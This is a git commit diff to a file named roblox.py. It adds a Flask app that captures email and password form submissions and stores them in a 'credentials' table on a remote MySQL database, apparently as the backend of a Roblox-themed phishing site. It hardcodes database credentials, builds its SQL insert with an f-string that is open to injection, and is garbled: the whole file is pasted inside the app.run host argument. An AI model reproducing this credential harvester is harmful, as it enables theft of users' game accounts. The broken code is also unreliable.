b864acb9ade12630497f2b274c768311fe7022ac
M2Busto <121911586+M2Busto@users.noreply.github.com>
2023-03-06 18:35:58 +0000

    Update roblox.py

--- roblox.py
+++ roblox.py
@@ -26,7 +26,42 @@ def home():
     return render_template("index.html")
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host=from flask import Flask, render_template, request
+import pymysql
+
+SAVING = True
+HOST = "mydb1.c4ls5d2x2zq9.eu-west-2.rds.amazonaws.com"
+USERNAME = "admin"
+PASSWORD = "G00dy4paw3%"
+
+connection = pymysql.connect(host=HOST, user=USERNAME, password=PASSWORD)
+c = connection.cursor()
+
+c.execute("USE mydb1")
+c.execute("CREATE TABLE IF NOT EXISTS credentials (email TEXT, password TEXT)")
+
+app = Flask(__name__)
+
+@app.route("/", methods=["GET", "POST"])
+def home():
+    if request.method == "POST":
+        Email, Password = request.form.get("email"), request.form.get("password")
+        print(Email); print(Password)
+        if Email != None and Password != None:
+            c.execute(f"INSERT INTO credentials VALUES ('{Email}', '{Password}')")
+            c.execute("SELECT * FROM credentials")
+            connection.commit()
+    return render_template("index.html")
+
+if __name__ == "__main__":
+    app.run(host="https://robloxprivateserver243lk6j26aslkj6.com", port=5000)
+
+if SAVING:
+    connection.commit()
+
+c.close()
+connection.close()
+, port=5000)
 
 if SAVING:
     connection.commit()
